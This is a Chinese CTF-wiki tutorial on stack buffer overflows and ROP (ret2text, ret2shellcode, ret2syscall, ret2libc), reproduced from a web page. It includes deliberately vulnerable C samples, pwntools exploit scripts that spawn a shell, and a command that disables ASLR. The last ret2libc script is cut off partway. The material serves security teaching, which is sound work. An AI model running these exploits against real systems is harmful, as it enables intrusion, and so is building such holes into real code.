> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [wiki.xazlsec.com](https://wiki.xazlsec.com/project-15/doc-254/)

> # 栈介绍 ## 基本栈介绍 栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操

基本栈介绍
-----

栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。

![][img-0]

高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，**程序的栈是从进程地址空间的高地址向低地址增长的**。

函数调用栈
-----

请务必仔细看一下下面的文章来学习一下基本的函数调用栈。

*   [C 语言函数调用栈 (一)](http://www.cnblogs.com/clover-toeic/p/3755401.html)
*   [C 语言函数调用栈 (二)](http://www.cnblogs.com/clover-toeic/p/3756668.html)

这里再给出另外一张寄存器的图

![][img-1]

需要注意的是，32 位和 64 位程序有以下简单的区别

*   **x86**
    *   **函数参数**在**函数返回地址**的上方
*   **x64**
    *   System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 **RDI, RSI, RDX, RCX, R8 和 R9 寄存器**中，如果还有更多的参数的话才会保存在栈上。
    *   内存地址不能大于 0x00007FFFFFFFFFFF，**6 个字节长度**，否则会抛出异常。

参考阅读
----

*   csapp
*   Calling conventions for different C++ compilers and operating systems, Agner Fog

介绍
--

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是

*   程序必须向栈上写入数据。
*   写入的数据大小没有被良好地控制。

基本示例
----

最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址所在的段具有可执行权限**。下面，我们举一个简单的例子：

```
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}

```

这个程序的主要目的读取一个字符串，并将其输出。**我们希望可以控制程序执行 success 函数。**

我们利用如下命令对其进行编译

```
➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.

```

可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，

> 历史上，**莫里斯蠕虫**第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。

gcc 编译指令中，`-m32` 指的是生成 32 位程序； `-fno-stack-protector` 指的是不开启堆栈溢出保护，即不生成 canary。  
此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令`gcc -v`查看 gcc 默认的开关情况。如果含有`--enable-default-pie`参数则代表 PIE 默认已开启，需要在编译指令中添加参数`-no-pie`。

编译成功后，可以使用 checksec 工具检查编译出的文件：

```
➜  stack-example checksec stack_example
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 `/proc/sys/kernel/randomize_va_space` 来控制 ASLR 启动与否，具体的选项有

*   0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。
*   1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。
*   2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。

我们可以使用`echo 0 > /proc/sys/kernel/randomize_va_space`关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。

为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。

确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到

```
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1
  gets(&s);
  return puts(&s);
}

```

该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为

```
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+

```

并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。

```
.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp

```

那么如果我们读取的字符串为

```
0x14*'a'+'bbbb'+success_addr
```

那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为

```
                                           +-----------------+
                                           |    0x0804843B   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+

```

但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是

```
\x3b\x84\x04\x08
```

但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：

```
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x0804843b
## 构造payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
print p32(success_addr)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()

```

执行一波代码，可以得到

```
➜  stack-example python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive

```

可以看到我们确实已经执行 success 函数。

小总结
---

上面的示例其实也展示了栈溢出中比较重要的几个步骤。

### 寻找危险函数

通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下

*   输入
    *   gets，直接读取一行，忽略’\x00’
    *   scanf
    *   vscanf
*   输出
    *   sprintf
*   字符串
    *   strcpy，字符串复制，遇到’\x00’停止
    *   strcat，字符串拼接，遇到’\x00’停止
    *   bcopy

### 确定填充长度

这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

*   相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得
*   相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。
*   直接地址索引，就相当于直接给定了地址。

一般来说，我们会有如下的覆盖需求

*   **覆盖函数返回地址**，这时候就是直接看 EBP 即可。
*   **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。
*   **覆盖 bss 段某个变量的内容**。
*   根据现实执行情况，覆盖特定的变量或地址的内容。

之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来**直接或者间接地控制程序执行流程**。

参考阅读
----

[stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)  
[http://bobao.360.cn/learning/detail/3694.html](http://bobao.360.cn/learning/detail/3694.html)  
[https://www.cnblogs.com/rec0rd/p/7646857.html](https://www.cnblogs.com/rec0rd/p/7646857.html)

随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。

之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件

*   程序存在溢出，并且可以控制返回地址。
    
*   可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
    

如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。

ret2text
--------

### 原理

ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。

这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。

### 例子

其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。

点击下载: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text)

首先，查看一下程序的保护机制

```
➜  ret2text checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4);
  printf("Maybe I will tell you next time !");
  return 0;
}

```

可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现

```
.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system

```

在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。

下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。

```
.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets

```

可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下

```
gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?
Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24        gets(buf);
───────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>

```

可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 `esp+0x1c`，因此，我们可以推断

*   s 的地址为 0xffffcd5c
*   s 相对于 ebp 的偏移为 0x6c
*   s 相对于返回地址的偏移为 0x6c+4

最后的 payload 如下：

```
##!/usr/bin/env python
from pwn import *
sh = process('./ret2text')
target = 0x804863a
sh.sendline('A' * (0x6c+4) + p32(target))
sh.interactive()

```

ret2shellcode
-------------

### 原理

ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。**一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码**。

在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。

### 例子

这里我们以 bamboofox 中的 ret2shellcode 为例

点击下载: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)

首先检测程序开启的保护

```
➜  ret2shellcode checksec ret2shellcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}

```

可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。

```
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]

```

这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。

```
gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 
Breakpoint 1, main () at ret2shellcode.c:8
8        setvbuf(stdout, 0LL, 2, 0LL);
─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
      6     int main(void)
      7     {
 →    8         setvbuf(stdout, 0LL, 2, 0LL);
      9         setvbuf(stdin, 0LL, 1, 0LL);
     10     
─────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]

```

通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限

```
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
```

那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。

具体的 payload 如下

```
#!/usr/bin/env python
from pwn import *
sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()

```

### 题目

*   sniperoj-pwn100-shellcode-x86-64

ret2syscall
-----------

### 原理

ret2syscall，即控制程序执行系统调用，获取 shell。

### 例子

这里我们以 bamboofox 中的 ret2syscall 为例

点击下载: [ret2syscall](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)

首先检测程序开启的保护

```
➜  ret2syscall checksec rop
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}

```

可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考

*   [https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8](https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8)

简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell

```
execve("/bin/sh",NULL,NULL)
```

其中，该程序是 32 位，所以我们需要使得

*   系统调用号，即 eax 应该为 0xb
*   第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
*   第二个参数，即 ecx 应该为 0
*   第三个参数，即 edx 应该为 0

而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。

首先，我们来寻找控制 eax 的 gadgets

```
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret

```

可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。

类似的，我们可以得到控制其它寄存器的 gadgets

```
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret

```

这里，我选择

```
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

这个可以直接控制其它三个寄存器。

此外，我们需要获得 /bin/sh 字符串对应的地址。

```
➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh

```

可以找到对应的地址，此外，还有 int 0x80 的地址，如下

```
➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc
Unique gadgets found: 4

```

同时，也找到对应的地址了。

下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。

```
#!/usr/bin/env python
from pwn import *
sh = process('./rop')
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()

```

### 题目

ret2libc
--------

### 原理

ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。

### 例子

我们由简单到难分别给出三个例子。

#### 例 1

这里我们以 bamboofox 中 ret2libc1 为例

点击下载: [ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1)

首先，我们可以检查一下程序的安全保护

```
➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}

```

可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在

```
➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
Strings information
============================================================
0x08048720 : /bin/sh

```

确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。

```
.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]
```

那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下

```
#!/usr/bin/env python
from pwn import *
sh = process('./ret2libc1')
binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)
sh.interactive()

```

这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 ‘bbbb’ 作为虚假的地址，其后参数对应的参数内容。

这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。

#### 例 2

这里以 bamboofox 中的 ret2libc2 为例

点击下载: [ret2libc2](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2)

该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下

```
##!/usr/bin/env python
from pwn import *
sh = process('./ret2libc2')
gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()

```

需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。

#### 例 3

这里以 bamboofox 中的 ret2libc3 为例

点击下载: [ret2libc3](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3)

在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护

```
➜  ret2libc3 checksec ret2libc3
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}

```

那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点

*   system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
*   即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下
    *   [https://github.com/niklasb/libc-database](https://github.com/niklasb/libc-database)

所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。

那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。**当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。**

我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme

*   [https://github.com/lieanu/LibcSearcher](https://github.com/lieanu/LibcSearcher)

此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。

这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下

*   泄露 __libc_start_main 地址
*   获取 libc 版本
*   获取 system 地址与 /bin/sh 的地址
*   再次执行源程序
*   触发栈溢出执行 system(‘/bin/sh’)

exp 如下

```
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')
ret2libc3 = ELF('./ret2libc3')
puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']
print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)
print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
print "get shell"
